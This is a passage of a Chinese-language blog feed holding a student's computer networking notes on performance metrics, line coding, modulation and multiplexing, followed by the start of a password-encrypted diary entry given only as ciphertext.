log_2(1 + SNR)<br>$$<br>该公式定义了通道的特性而非传输方式，<strong>其速率与使用的信号电平数量无关</strong></p><h3 id="3-5-性能"><a href="#3-5-性能" class="headerlink" title="3.5 性能"></a>3.5 性能</h3><p>我们通过以下几个方面衡量网络的性能</p><h4 id="带宽"><a href="#带宽" class="headerlink" title="带宽"></a>带宽</h4><p>链路速度的潜在衡量值，主要有两种衡量方式：以赫兹衡量&#x2F;以每秒比特数衡量</p><h4 id="吞吐量"><a href="#吞吐量" class="headerlink" title="吞吐量"></a>吞吐量</h4><p>即单位时间内成功传输的数据量，是链路速度的实际衡量值</p><h4 id="延迟"><a href="#延迟" class="headerlink" title="延迟"></a>延迟</h4><p>延迟定义了第一个位从源开始发出到整个报文完全到达目标所经历的时间，由以下四个部分组成</p><h5 id="传播时间（propagation-time）"><a href="#传播时间（propagation-time）" class="headerlink" title="传播时间（propagation time）"></a>传播时间（propagation time）</h5><p>即一个位从源传输到目标所需的时间，通过<code>距离➗传播速度</code>计算而得</p><h5 id="传输时间（transmission-time）"><a href="#传输时间（transmission-time）" class="headerlink" title="传输时间（transmission time）"></a>传输时间（transmission time）</h5><p>即传输一个报文所需的时间，计算公式为<code>报文长度➗带宽</code></p><h5 id="排队时间（queuing-time）"><a href="#排队时间（queuing-time）" class="headerlink" title="排队时间（queuing time）"></a>排队时间（queuing time）</h5><p>每个中间或端设备在处理报文前保持报文所需的时间</p><h5 id="处理延迟（processing-delay）"><a href="#处理延迟（processing-delay）" class="headerlink" title="处理延迟（processing delay）"></a>处理延迟（processing delay）</h5><p>接收者处理报文所需时间</p><h2 id="Chapter-4-数字传输"><a href="#Chapter-4-数字传输" class="headerlink" title="Chapter 4 - 数字传输"></a>Chapter 4 - 数字传输</h2><h3 id="4-1-数字到数字转换"><a href="#4-1-数字到数字转换" class="headerlink" title="4.1 数字到数字转换"></a>4.1 数字到数字转换</h3><h4 id="线路编码（line-coding）"><a href="#线路编码（line-coding）" class="headerlink" title="线路编码（line coding）"></a>线路编码（line coding）</h4><p>线路编码即为将数字数据转换为数字信号的过程（0110…转换为高低电平），首先明确如下两个概念：</p><ul><li><p><strong>数据元素</strong>（data element）：数据元素为表示一块信息的最小实体，即<strong>位</strong></p></li><li><p><strong>信号元素</strong>（signal element）：数字信号的最小单元</p></li></ul><p>数据元素为我们需要发送的数据，信号元素则为我们实际发送的信号，<strong>比率r</strong>为<strong>每个信号元素所承载的数据元素的数量</strong></p><p>由以上两个概念有如下定义：</p><ul><li><strong>数据速率</strong>（data rate）：1 秒内发送的数据元素（位）的数量（也就是<strong>比特率</strong>），单位为 bps</li><li><strong>信号速率</strong>（signal rate）：1 秒内发送的信号元素的数量，单位为<strong>波特</strong>（baud），即<strong>波特率</strong></li></ul><blockquote><p>这里注意 baud 本身就包含“每秒”的含义在内，故不存在“波特每秒”的说法</p></blockquote><p>设 <em>N</em> 为数据速率，<em>c</em> 为情形因子，<em>S</em> 为信号速率，数据速率与信号速率的关系如下：<br>$$<br>S &#x3D; c × N × \frac{1}{r}baud<br>$$<br>最小带宽的计算公式如下：<br>$$<br>B_{min} &#x3D; c × N × \frac{1}{r}<br>$$<br>若通道带宽恒定为 B ，则最大数据速率为：<br>$$<br>N_{max} &#x3D; \frac{1}{c} × B × r<br>$$<br><strong>基线</strong>即为接收方计算接收到信号功率的运行平均值，对于一长串的 0 或 1 的接受很容易引起基线的偏移，称为<strong>基线偏移</strong>（baseline wandering）</p><p>当数字信号中电平保持一段时间的恒定时，频谱会产生接近 0 的低频，称之为<strong>直流成分</strong></p><p><strong>自同步</strong>（self-synchronization）信号在数据中包含有定时信息，以实现双方时钟同步</p><h4 id="编码方案"><a href="#编码方案" class="headerlink" title="编码方案"></a>编码方案</h4><p><img src="https://i.loli.net/2021/10/10/AXvGWmOlxhowsqR.png" alt="image.png"></p><h5 id="单极编码方案（Unipolar）"><a href="#单极编码方案（Unipolar）" class="headerlink" title="单极编码方案（Unipolar）"></a>单极编码方案（Unipolar）</h5><p>即所有信号电平都在时间轴的一边（时间轴上方或下方）</p><ul><li><strong>不归零</strong>（<strong>Non-Return-to-Zero, NRZ</strong>）方案：正电平定义为 1 而负电平定义为 0，在位中间信号不会回到0，有着 <em><code>N/2 Bd</code></em> 的平均信号速率</li></ul><h5 id="极性编码方案（Polar）"><a href="#极性编码方案（Polar）" class="headerlink" title="极性编码方案（Polar）"></a>极性编码方案（Polar）</h5><p>即信号电平分布在时间轴的两边</p><blockquote><p>例如 0 的电平为正数而 1 的电平为负数</p></blockquote><ul><li><p><strong>不归零</strong>（<strong>Non-Return-to-Zero, NRZ</strong>）方案：</p><ul><li><strong>NRZ-L</strong>（<strong>NRZ电平编码，即 NRZ-Level</strong>）：即由信号电平决定位值</li><li><strong>NRZ-I</strong>（<strong>NRZ反相编码，即 NRZ-Invert</strong>）：信号电平是否反转决定位值（下一个位电平未反转为0，反转了就是1）</li></ul><p>这两种方案都有着 <em><code>N/2 Bd</code></em> 的平均信号速率，且都存在基线偏移、同步问题、直流成分问题</p><p><img src="https://i.loli.net/2021/10/11/Y1DXC2Jc5SQAzZ8.png" alt="image.png"></p></li><li><p><strong>归零编码</strong>（<strong>Return-to-Zeron，RZ</strong>）：信号在位中间变化，在每个位中间信号变为0，由两个信号编码一个位</p></li></ul><p><img src="https://i.loli.net/2021/10/11/iVKm2AzTeaB85n1.png" alt="image.png"></p><ul><li><p><strong>双相编码</strong>（<strong>biphase</strong>）：</p><ul><li><strong>曼彻斯特编码方案</strong>：两个电平编码一个位（例如【负-正】为1，【正-负】为0）</li><li><strong>差分曼彻斯特编码方案</strong>：类似于曼彻斯特编码，不过由跳变决定位值（下一个信号的第一个电平未跳变为1，跳变为0)</li></ul><p>这两种编码方案中间的跳变用以同步，也不存在基线偏移与直流成分的问题，有着 <em><code>N Bd</code></em> 的平均信号速率</p><p><img src="https://i.loli.net/2021/10/11/w9kZh3CxKt8DmcU.png" alt="image.png"></p></li></ul><h5 id="双极性方案（bipolar）"><a href="#双极性方案（bipolar）" class="headerlink" title="双极性方案（bipolar）"></a>双极性方案（bipolar）</h5><p>又称多电平二进制，其中一个数据元素的电平固定为0，另一个则在正负值间交替。</p><ul><li><p><strong>AMI</strong>（alternate mark inversion）：中值0电平表示0，1由交替正负电平表示</p></li><li><p><strong>伪三元编码</strong>：AMI的变形，中值0电平表示1，0由交替正负电平表示</p></li></ul><p>  双极性方案没有直流成分，有着 <em><code>N/2 Bd</code></em> 的平均信号速率，通常用于长距离通信，但<strong>当数据中存在0的长序列时就会有同步问题</strong></p><p>  <img src="https://i.loli.net/2021/10/11/HaMg9Pu4kozdcrI.png" alt="image.png"></p><h5 id="多电平方案（multilevel）"><a href="#多电平方案（multilevel）" class="headerlink" title="*多电平方案（multilevel）"></a>*多电平方案（multilevel）</h5><p>由多个电平表示多个数据元素-&gt;mBnL：有L个电平模式，由n个信号表示m（长度）B（二进制数据）数据</p><h5 id="多线路传输（multitransition）"><a href="#多线路传输（multitransition）" class="headerlink" title="*多线路传输（multitransition）"></a>*多线路传输（multitransition）</h5><p>比较典型的就是MLT-3</p><h4 id="块编码（block-coding）"><a href="#块编码（block-coding）" class="headerlink" title="*块编码（block coding）"></a>*块编码（block coding）</h4><p>即将 <code>m 位/块</code> 的一组块重新分为 <code>n 位/块</code>的一组块，又称为 <code>mB/nB</code> 编码技术</p><p><img src="https://i.loli.net/2021/10/11/iJwnmoaXgDVWYGQ.png" alt="image.png"></p><h3 id="4-2-模拟到数字转换"><a href="#4-2-模拟到数字转换" class="headerlink" title="4.2 模拟到数字转换"></a>4.2 模拟到数字转换</h3><h4 id="脉冲码调制（Pulse-Code-Modulation-PCM）"><a href="#脉冲码调制（Pulse-Code-Modulation-PCM）" class="headerlink" title="脉冲码调制（Pulse Code Modulation, PCM）"></a>脉冲码调制（Pulse Code Modulation, PCM）</h4><p>将模拟信号转换为数字信号的最通用技术，有如下三个过程：</p><p><img src="https://i.loli.net/2021/10/11/Ep9zod8LD6hcgQK.png" alt="image.png"></p><h5 id="1-采样（sampling）"><a href="#1-采样（sampling）" class="headerlink" title="1.采样（sampling）"></a>1.采样（sampling）</h5><p>又称为<strong>脉冲振幅调制</strong>（pulse amplitude modulation， <strong>PAM</strong>），主要关注两个方面：</p><ul><li><strong>采样率</strong>（sampling rate）：我们每隔 <em><strong>T<sub>s</sub></strong></em> 秒进行一次采样，采样率 _<strong>f<sub>s </sub></strong>_便是<strong>采样间隔的倒数</strong>，又称为采样频率（sampling frequency）</li><li><strong>奈奎斯特采样定理</strong>：为了再生原始模拟信号，<strong>采样速率至少为原始信号最高频率的两倍</strong></li></ul><h5 id="2-量化（quantizing）"><a href="#2-量化（quantizing）" class="headerlink" title="2.量化（quantizing）"></a>2.量化（quantizing）</h5><p>即将信号的连续取值近似为有限多个离散值的过程，如下：</p><ul><li>假定原始模拟信号振幅介于 <em><strong>V<sub>min</sub></strong></em> 和 <em><strong>V<sub>min</sub></strong></em> 之间</li><li>将范围分为 L 个区间，每个区间高度为 Δ</li><li>分配 0 到 L-1 的量化值给每个区间的中点</li><li>样本振幅值近似为量化值</li></ul><h6 id="量化误差"><a href="#量化误差" class="headerlink" title="量化误差"></a>量化误差</h6><p>量化是一个将实际值转为近似值的过程，因此会存在误差，其对信号 SNR<sub>dB</sub> 的影响取决于量化级别 L 或<strong>每个样本位数</strong> n<sub>b</sub></p><h5 id="3-编码（encoding）"><a href="#3-编码（encoding）" class="headerlink" title="3.编码（encoding）"></a>3.编码（encoding）</h5><p>将量化后的离散信号转换为原始信号的过程，编码的比特率可以由如下公式计算：<br>$$<br>比特率 &#x3D; 采样速率 × 每个样本位数<br>$$</p><h3 id="4-3-传输模式"><a href="#4-3-传输模式" class="headerlink" title="4.3 传输模式"></a>4.3 传输模式</h3><h4 id="并行传输（parallel-transmission）"><a href="#并行传输（parallel-transmission）" class="headerlink" title="并行传输（parallel transmission）"></a>并行传输（parallel transmission）</h4><p>使用 n 条通信线路，从而一次可以发送 n 位数据</p><h4 id="串行传输（serial-transmission）"><a href="#串行传输（serial-transmission）" class="headerlink" title="串行传输（serial transmission）"></a>串行传输（serial transmission）</h4><p>只需要 1 条通信线路，一次发发送 1位数据，有三种模式：</p><ul><li><strong>异步传输</strong>（asynchronous transmission）：将位流按字节分组，（在字节级别上）传输过程中不关心信号的时序（每个 bit 仍要同步），在每个字节开始与结尾添加起始位与停止位以提示接收方</li><li><strong>同步传输</strong>（synchronous transmission）：将位流组合为更长的“帧”，一帧包含数个字节，发送方依次发送位流而不含起始位、停止位与间隙</li><li><strong>等时传输</strong>（isochronous transmission）：保证数据以固定速率到达</li></ul><h2 id="Chapter-5-模拟传输"><a href="#Chapter-5-模拟传输" class="headerlink" title="Chapter 5 - 模拟传输"></a>Chapter 5 - 模拟传输</h2><p>数字传输需要低通通道，而我们通常只有带通通道，因此需要将数字数据&#x2F;低通模拟信号转换为带通模拟信号</p><h3 id="5-1-数字到模拟转换"><a href="#5-1-数字到模拟转换" class="headerlink" title="5.1 数字到模拟转换"></a>5.1 数字到模拟转换</h3><p><img src="https://i.loli.net/2021/10/11/oxNdktvlIfn2iMa.png" alt="image.png"></p><h4 id="比特率和波特率"><a href="#比特率和波特率" class="headerlink" title="比特率和波特率"></a>比特率和波特率</h4><p>与数字传输相似，我们同样可以定义比特率与波特率，设比特率为 <em>N</em> ，波特率为 _S_，比率为 _r_，其关系如下：<br>$$<br>S &#x3D; N × \frac{1}{r} baud<br>$$<br>在模拟传输中有 _<strong>r &#x3D; log<sub>2</sub>L</strong>_，其中 <code>L</code> 为信号元素类型，而非电平数，<strong>波特率小于比特率</strong></p><h4 id="幅移键控（amplitude-shift-keying，-ASK）"><a href="#幅移键控（amplitude-shift-keying，-ASK）" class="headerlink" title="幅移键控（amplitude-shift keying， ASK）"></a>幅移键控（amplitude-shift keying， ASK）</h4><p><img src="https://i.loli.net/2021/10/11/9BigYEr1qPxCHZm.png" alt="image.png"></p><p>以基带数字信号控制载波的幅度变化的调制方式称为幅移键控(ASK)，又称数字调幅</p><p>通过改变载波信号的振幅来生成信号元素，<strong>只有振幅变化而频率和相位保持不变</strong></p><h5 id="二进制-ASK（BASK）"><a href="#二进制-ASK（BASK）" class="headerlink" title="二进制 ASK（BASK）"></a>二进制 ASK（BASK）</h5><p>信号元素只使用两个电平称之为二进制幅移键控或开关键控（OOK）</p><h5 id="ASK-带宽"><a href="#ASK-带宽" class="headerlink" title="ASK 带宽"></a>ASK 带宽</h5><p>设信号速率为 _S_，带宽为 <em>B</em> ，取一个因子 <em>d</em> （取决于调制与过滤处理，值在区间 <code>[0,1]</code>），带宽与信号速率的关系如下：<br>$$<br>B &#x3D; (1+d)×S<br>$$<br>这个公式说明所需带宽最小为 S，最大为 2S，载波频率 <em><strong>f<sub>c</sub></strong></em> 位于带宽中间</p><h4 id="频移键控（Frequency-shift-keying，FSK）"><a href="#频移键控（Frequency-shift-keying，FSK）" class="headerlink" title="频移键控（Frequency-shift keying，FSK）"></a>频移键控（Frequency-shift keying，FSK）</h4><p><img src="https://i.loli.net/2021/10/11/kg7T5rdDzsu8lAn.png" alt="image.png"></p><p>以基带数字信号控制载波的频率变化的调制方式称为频移键控，通过改变载波信号的频率来表示数据，信号元素的振幅峰值与相位保持不变</p><h5 id="二进制-FSK（BFSK）"><a href="#二进制-FSK（BFSK）" class="headerlink" title="二进制 FSK（BFSK）"></a>二进制 FSK（BFSK）</h5><p>即使用两个载波频率表示 0 与 1，通常这两个载波频率很高，之间的差很小</p><p>BFSK 的实现方式有：</p><ul><li><strong>相干</strong>：两个信号元素的边界处的相位是连续的</li><li><strong>非相干</strong>：两个信号元素的边界处的相位是非连续的，可以看作两个 ASK</li></ul><h6 id="BFSK-的带宽"><a href="#BFSK-的带宽" class="headerlink" title="BFSK 的带宽"></a>BFSK 的带宽</h6><p>我们可以将 FSK 看做有着自己载波频率的两个 ASK 信号，若两频率差值为 <em><strong>2 Δf</strong></em> ，则 BFSK 要求的带宽为：<br>$$<br>B &#x3D; (1+d)×S + 2 Δf<br>$$</p><h4 id="相移键控（phase-shift-keying，PSK）"><a href="#相移键控（phase-shift-keying，PSK）" class="headerlink" title="相移键控（phase-shift keying，PSK）"></a>相移键控（phase-shift keying，PSK）</h4><p>以基带数字信号控制载波的相位变化的调制方式称为相移键控，通过改变载波的相位来表示两个或多个信号元素，信号元素的峰值振幅与频率保持不变</p><h5 id="二进制-PSK（BPSK）"><a href="#二进制-PSK（BPSK）" class="headerlink" title="二进制 PSK（BPSK）"></a>二进制 PSK（BPSK）</h5><p><img src="https://i.loli.net/2021/10/11/7nhKPUdlq3R5NOc.png" alt="image.png"></p><p>即只有两个信号元素，一个相位为 0° 而另一个为 180°，相比起 ASK 而言更不易受噪声影响，也不似 FSK 一般需要两个载波信号</p><h6 id="BPSK-的带宽"><a href="#BPSK-的带宽" class="headerlink" title="BPSK 的带宽"></a>BPSK 的带宽</h6><p>$$<br>B &#x3D; (1+d)×S<br>$$</p><h5 id="正交-PSK（QPSK）"><a href="#正交-PSK（QPSK）" class="headerlink" title="正交 PSK（QPSK）"></a>正交 PSK（QPSK）</h5><p>使用两个独立的 BPSK 调制：一个为同相的，一个为正交（异相）的</p><h5 id="正交振幅调制"><a href="#正交振幅调制" class="headerlink" title="正交振幅调制"></a>正交振幅调制</h5><p>为 ASK 与 PSK 的结合：<strong>使用两个载波，一个同相而另一个正交，每个载波都使用不同的振幅</strong>，带宽与 ASK 和 PSK 的最小带宽相同</p><h3 id="5-2-模拟信号调制"><a href="#5-2-模拟信号调制" class="headerlink" title="*5.2 模拟信号调制"></a>*5.2 模拟信号调制</h3><p>由于介质的限制因此有的时候我们还需要将模拟信号进行调制，即<strong>模拟到模拟转换</strong>（analog-to-analog conversion），主要有三种方法：</p><ul><li><p>调幅（amplitude modulation，AM）</p></li><li><p>调频（frequency modulation，FM）</p></li><li><p>调相（phase modulation，PM）</p></li></ul><h2 id="Chapter-6-带宽利用"><a href="#Chapter-6-带宽利用" class="headerlink" title="Chapter 6 - 带宽利用"></a>Chapter 6 - 带宽利用</h2><p>为达到相应的目的，有时需要对带宽进行特殊的利用：复用带宽以获得效率、扩频以进行保密与抗干扰</p><h3 id="6-1-复用（multiplexing）"><a href="#6-1-复用（multiplexing）" class="headerlink" title="6.1 复用（multiplexing）"></a>6.1 复用（multiplexing）</h3><p>复用即允许同时通过一条数据链路传输多个信号的一组技术：多条线路的传输流量送到<strong>复用器</strong>（multiplexer，MUX）后被组成一个单独的传输流，在接收端被<strong>分离器</strong>（demultiplexer，DEMUX）接收，分解为原先的独立传输流</p><h4 id="频分复用（frequency-division-multiplexing，-FDM）"><a href="#频分复用（frequency-division-multiplexing，-FDM）" class="headerlink" title="频分复用（frequency-division multiplexing， FDM）"></a>频分复用（frequency-division multiplexing， FDM）</h4><p><img src="https://i.loli.net/2021/10/11/KduOHNaS5oUZwIc.png" alt="image.png"></p><p>在链路带宽大于待传输信号带宽之和时使用：<strong>将不同的信号调制到不同频率的载波上，再将调制后的信号合并为一个复合信号进行传输</strong></p><p>不同信号的通道间会有部分带宽未被使用，作为<strong>防护带宽</strong>进行分隔以防止信号重叠</p><h4 id="波分复用（wave-division-multiplexing，-WDM）"><a href="#波分复用（wave-division-multiplexing，-WDM）" class="headerlink" title="波分复用（wave-division multiplexing， WDM）"></a>波分复用（wave-division multiplexing， WDM）</h4><p>将多个信号调制为不同波长的信号，合并为复合信号进行传输，类似于 FDM</p><blockquote><p>主要用于光缆</p></blockquote><h4 id="时分复用（time-division-multiplexing，TDM）"><a href="#时分复用（time-division-multiplexing，TDM）" class="headerlink" title="时分复用（time-division multiplexing，TDM）"></a>时分复用（time-division multiplexing，TDM）</h4><p>TDM 为数字化的共享过程，共享的是<strong>时间</strong>：<strong>每个连接占用该条链路的一个时间段进行传输</strong></p><h5 id="同步时分复用（synchronous-TDM）"><a href="#同步时分复用（synchronous-TDM）" class="headerlink" title="同步时分复用（synchronous TDM）"></a>同步时分复用（synchronous TDM）</h5><p><img src="https://i.loli.net/2021/10/11/Z2PHGCawpDjOM8i.png" alt="image.png"></p><ul><li>每个输入连接的数据流被划分成<strong>多个单元</strong>（一位、一字节、一个数据块…），每个输入占用一个输入间隙</li><li>每个输入单元成为一个输出单元，占用一个输出间隙</li><li>每个输出单元的持续时间是输入单元持续时间的 <code>1/n</code></li></ul><p>在同步 TDM 中，链路速率为数据速率的 n 倍，比单元持续时间短 n 倍，TDM 通过添加<strong>帧指示位</strong>解决复用器与解复用器间的同步问题</p><p>不同链路输入数据速率可能存在差异，当某一输入端没有数据发送时会出现<strong>空时隙</strong>，解决方案如下：</p><ul><li><strong>多级复用</strong>：多级 TDM</li><li><strong>多时隙分配</strong>：为一条输入线分配多个时隙</li><li><strong>脉冲填充</strong>：为速率较低的线路添加额外的虚位作为脉冲填充</li></ul><h5 id="统计时分复用（statistical-TDM）"><a href="#统计时分复用（statistical-TDM）" class="headerlink" title="统计时分复用（statistical TDM）"></a>统计时分复用（statistical TDM）</h5><p><img src="https://i.loli.net/2021/10/11/krDoZJAMEmi6O5d.png" alt="image.png"></p><p>动态地进行时隙的分配以避免空时隙的出现，提高带宽的效率，与同步 TDM 不同的是其不需要同步位</p><h3 id="6-2-扩频（spread-spectrum，SS）"><a href="#6-2-扩频（spread-spectrum，SS）" class="headerlink" title="6.2 扩频（spread spectrum，SS）"></a>6.2 扩频（spread spectrum，SS）</h3><p><img src="https://i.loli.net/2021/10/11/4wudMCfeF862aqg.png" alt="image.png"></p><p>将传输信号的频谱（spectrum）打散到较其原始带宽更宽的一种通信技术，常用于无线通信领域（LAN 与 WAN）</p><ul><li>对每个站点所需分配带宽比原所需带宽大</li><li>带宽的扩大过程为<strong>与原信号无关的过程</strong>，即在信号由源端生成后才进行扩频</li></ul><h2 id="Chapter-7-传输介质"><a href="#Chapter-7-传输介质" class="headerlink" title="Chapter 7 - 传输介质"></a>Chapter 7 - 传输介质</h2><h2 id="Chapter-8-交换"><a href="#Chapter-8-交换" class="headerlink" title="Chapter 8 - 交换"></a>Chapter 8 - 交换</h2><h2 id="Chapter-9-使用电话网与有线电视网进行数据传输"><a href="#Chapter-9-使用电话网与有线电视网进行数据传输" class="headerlink" title="Chapter 9 - 使用电话网与有线电视网进行数据传输"></a>Chapter 9 - 使用电话网与有线电视网进行数据传输</h2><h1 id="0x03-数据链路层"><a href="#0x03-数据链路层" class="headerlink" title="0x03.数据链路层"></a>0x03.数据链路层</h1><h2 id="Chapter-10-检错与纠错"><a href="#Chapter-10-检错与纠错" class="headerlink" title="Chapter 10 - 检错与纠错"></a>Chapter 10 - 检错与纠错</h2><h2 id="Chapter-11-数据链路控制"><a href="#Chapter-11-数据链路控制" class="headerlink" title="Chapter 11 - 数据链路控制"></a>Chapter 11 - 数据链路控制</h2><h2 id="Chapter-12-多路访问"><a href="#Chapter-12-多路访问" class="headerlink" title="Chapter 12 - 多路访问"></a>Chapter 12 - 多路访问</h2><h2 id="Chapter-13-有线局域网：以太网"><a href="#Chapter-13-有线局域网：以太网" class="headerlink" title="Chapter 13 - 有线局域网：以太网"></a>Chapter 13 - 有线局域网：以太网</h2><h2 id="Chapter-14-无线局域网"><a href="#Chapter-14-无线局域网" class="headerlink" title="Chapter 14 - 无线局域网"></a>Chapter 14 - 无线局域网</h2><h2 id="Chapter-15-连接局域网、主干网和虚拟局域网"><a href="#Chapter-15-连接局域网、主干网和虚拟局域网" class="headerlink" title="Chapter 15 -连接局域网、主干网和虚拟局域网"></a>Chapter 15 -连接局域网、主干网和虚拟局域网</h2><h2 id="Chapter-16-无线WAN：移动电话和卫星网络"><a href="#Chapter-16-无线WAN：移动电话和卫星网络" class="headerlink" title="Chapter 16 - 无线WAN：移动电话和卫星网络"></a>Chapter 16 - 无线WAN：移动电话和卫星网络</h2><h2 id="Chapter-17-广域网SONET-x2F-SDH"><a href="#Chapter-17-广域网SONET-x2F-SDH" class="headerlink" title="Chapter 17 - 广域网SONET&#x2F;SDH"></a>Chapter 17 - 广域网SONET&#x2F;SDH</h2><h2 id="Chapter-18-虚电路网络：帧中继和ATM"><a href="#Chapter-18-虚电路网络：帧中继和ATM" class="headerlink" title="Chapter 18 - 虚电路网络：帧中继和ATM"></a>Chapter 18 - 虚电路网络：帧中继和ATM</h2><h1 id="0x04-网络层"><a href="#0x04-网络层" class="headerlink" title="0x04.网络层"></a>0x04.网络层</h1><h2 id="Chapter-19-逻辑寻址"><a href="#Chapter-19-逻辑寻址" class="headerlink" title="Chapter 19 - 逻辑寻址"></a>Chapter 19 - 逻辑寻址</h2><h2 id="Chapter-20-IP协议"><a href="#Chapter-20-IP协议" class="headerlink" title="Chapter 20 - IP协议"></a>Chapter 20 - IP协议</h2><h2 id="Chapter-21-地址映射、差错报告和多播"><a href="#Chapter-21-地址映射、差错报告和多播" class="headerlink" title="Chapter 21 - 地址映射、差错报告和多播"></a>Chapter 21 - 地址映射、差错报告和多播</h2><h2 id="Chapter-22-传递、转发和路由选择"><a href="#Chapter-22-传递、转发和路由选择" class="headerlink" title="Chapter 22 - 传递、转发和路由选择"></a>Chapter 22 - 传递、转发和路由选择</h2><h1 id="0x05-传输层"><a href="#0x05-传输层" class="headerlink" title="0x05.传输层"></a>0x05.传输层</h1><h2 id="Chapter-23-UDP、TCP和SCTP"><a href="#Chapter-23-UDP、TCP和SCTP" class="headerlink" title="Chapter 23 - UDP、TCP和SCTP"></a>Chapter 23 - UDP、TCP和SCTP</h2><h2 id="Chapter-24-拥塞控制和服务质量"><a href="#Chapter-24-拥塞控制和服务质量" class="headerlink" title="Chapter 24 - 拥塞控制和服务质量"></a>Chapter 24 - 拥塞控制和服务质量</h2><h1 id="0x06-应用层"><a href="#0x06-应用层" class="headerlink" title="0x06.应用层"></a>0x06.应用层</h1><p>这一部分好像都是科普性质，考试应该也不考，可能要摸</p><h2 id="Chapter-25-域名系统"><a href="#Chapter-25-域名系统" class="headerlink" title="Chapter 25 - 域名系统"></a>Chapter 25 - 域名系统</h2><h2 id="Chapter-26-远程登陆、电子邮件与文件传输"><a href="#Chapter-26-远程登陆、电子邮件与文件传输" class="headerlink" title="Chapter 26 - 远程登陆、电子邮件与文件传输"></a>Chapter 26 - 远程登陆、电子邮件与文件传输</h2><h2 id="Chapter-27-万维网与超文本传输协议"><a href="#Chapter-27-万维网与超文本传输协议" class="headerlink" title="Chapter 27 - 万维网与超文本传输协议"></a>Chapter 27 - 万维网与超文本传输协议</h2><h2 id="Chapter-28-网络管理"><a href="#Chapter-28-网络管理" class="headerlink" title="Chapter 28 - 网络管理"></a>Chapter 28 - 网络管理</h2><h2 id="Chapter-29-多媒体"><a href="#Chapter-29-多媒体" class="headerlink" title="Chapter 29 - 多媒体"></a>Chapter 29 - 多媒体</h2><h1 id="0x07-网络安全"><a href="#0x07-网络安全" class="headerlink" title="0x07.网络安全"></a>0x07.网络安全</h1><p>这一部分好像都是科普性质，考试应该也不考，摸了</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;我爱计网计网爱我&lt;/p&gt;</summary>
    
    
    
    <category term="NETWORK" scheme="http://blog.arttnba3.cn/categories/NETWORK/"/>
    
    
    <category term="计算机网络" scheme="http://blog.arttnba3.cn/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
    
  </entry>
  
  <entry>
    <title>【PIECES.0x01】Shell之外的往事：夏天的风</title>
    <link href="http://blog.arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/"/>
    <id>http://blog.arttnba3.cn/2021/09/07/PIECES-0X01-SHELL_OUTSIDE-1-WINDY_SUMMER/</id>
    <published>2021-09-06T21:24:59.000Z</published>
    <updated>2022-06-26T05:15:14.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="链接：https://pan.baidu.com/s/1glFilTF8ua6hI-bklKgJXw 提取码：cth0" data-whm="还请不要做一些奇奇怪怪的事情！">  <script id="hbeData" type="hbeData" data-hmacdigest="3e5776f56210393896028edc3afb6f14b7284fbff871de4800b7136399970d0b">eef143a3a3e51e2ee0b1e9c84de8c53c5af9a8774c5ccd7761c7ce1da7021303af3a5f4afe1182ef44b9570739980a2a177218976c11dc3e94ea28b1308ea85f4bc67c79fca9c560933e43208f8300d905efc0b3c96eae5c2e2af117daad2b2c6caa290fc707787fd3197b4b872654aaa8d62f0ec0ee1aed8ed9cb702191a2f643d659bd2b6e4ce9402f0083fb2edee066b597a437c3baf23ee3b85553393839dee2c020ba0f1ff602a06dc926031b0ae94c8bde3b4fbfff6a22b7f43bc599113cb8e71096273c7c89e72d23d5c8fd278e77945cb90c4472372d27cab14b08691a5ebdbbc5077f3101aa47945ac4d2725b81243c81fb52acf80c6ec5615ad98b146251a879f3d2d2586e3bf740f799fa5b149ecf45161bd532e5de2a86a768ac4aebc7735175aa59511c3ad34f4d8d7dc1127cb4351d9b710ed6be83023c179c3d5c425cdc91f2bb27f6082e8954b258596face167f92a7cf17b19c833cfb6eede2eb2fea6a2fdb01df20111216ad7706c1c1cc0bb87cfc8eb20f662fd6365d48fcd3b32f9b14ed86d4b2f21fd99461deb181c762d2e40358d632f818d7318ff4d9c8b2a5d7a6dde224fe907f580504d8197d50a1609f3abe055bae8c2edbda7c44bc8de9b15647c1f6e5b1be4b4ea69f67b2fcd13372f881f6e1a26450a9514000d96f196a4f40b0cdd528b3d0fa27ab88151a936f7cf848b9a0bcd676d838763a3697b83ed13c575fd718e85d2daa8d1aef1c34317ddad580d1a153a9e8c1a82cc84b475854344b8d2c12eae14bf98bac965ff08ee5915f9f05b664a2dbb4030fca9957798d665a7b7bdcc47deda64c553e036edec1eeec9c6f45736bc846957e5fee0a66ebc19259d2fb679f1aaaf51758ba8f677279daf8c00a57a829539ffa412aeccad4f13823e843ab0ed82c4cf389ad1a2423c14b95788522ce80ec643b3fa54938e9cbad34e4d0efc98a2efdfe38a16dddebef1862508ef13692594bbc8bc74bbef48beda5db50b217b61e555b58a8ce1107e12129ed816df4e204c653bcbbe4164a9a865d2e9e821c26cfbfec88c4692d20beea4ae022d4c5a469e05bf927e8d25f9ecd7386d69cc803deaf6397ed79558c381a9887d1ebcb0bd276195650f7afedbf45094b2406277fc074567bc418440a571080cec35b69f23c87625cadb0250d90cf08d329f71fa48fc5e7a4f877a642eee4e659235ecc10f9987764c2325fbe8249a435ceb00a5ce25ea601ecc9f320f419474aa2bcdc30a5358c64641783cda701ca08f5e3f75df3e4678aff581feae2ee722a2a92c176bfdb3fc826c1a25956f8382bcd9a02c52453aefa93c0ca4ae304b4f9172fed07f938417206e3ca118fe68dd377525b4565b5f106f6939f224964e44d1f0a538b18116f13157007bb05db1d9aee1c8a45a3427fefd03eba4f75c0ed16e5c447bc455a776b40811e59ad6e9fafea176ad08870102198f8b21f2f48d36f88efdcac391c4b19df2fd74c06f7cd91cd7bcbe0e5786e340a79e3bd985db4acaae999bc6190379111931a0428b21a6f8eb2c84367d0cf4d2ff7880c9acfdd9289ff4985b96e12c55b299af31a0abc024cc4403c7ee706772176384dc7768c7df6bd5540bd5d11745359c19670023e11e2d28d6fe48f7a2a38df475bd8b38a07c25f65a2dd534ab7e512000e1b8ab3fd6c076bfd020ea093abe05d35d7224cc188d4028e151df8435db8e0c204c5196b0af73e7c163ac468429fadaca02d2bd9d9f50ce491a92d356ff8c794fbdddae1b939dd61a609f390cb95e59ae0cc129b6d11284ce4a8d6e1bd06f99cd4a6bb076755282bfb26d31667b867d5d74605d298f8813fe5bd997a95f34d975844dd0a77c72f46b35725ca6115dca702e014f2fc1c1838f417dae802e2369bdc6b4c860fe7b4e670da0724ad985f5da7484211